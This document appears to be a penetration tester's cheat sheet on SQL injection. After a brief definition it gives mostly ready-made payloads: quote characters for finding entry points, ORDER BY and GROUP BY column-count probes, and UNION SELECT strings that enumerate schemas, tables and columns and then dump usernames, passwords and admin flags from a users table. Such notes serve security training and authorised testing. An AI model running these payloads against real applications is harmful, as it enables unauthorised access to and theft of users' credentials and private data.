# SQL Injection

SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behaviour.

## Entry Point

```console

'
"
`
')
")
`)
'))
"))
`))
```

Look for error messages

## Union based

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.

### Determing Number of Columns**

**Order by**
```
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```

**Group by**
```
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```

**Union SELECT**
```
0 union select 1,2,3,4 -- -

or

1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worke
```
### Extract database names, table names and column names

```
0 union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -
0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'-- -
0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='users'-- -
0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -
0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='messages'-- -
```

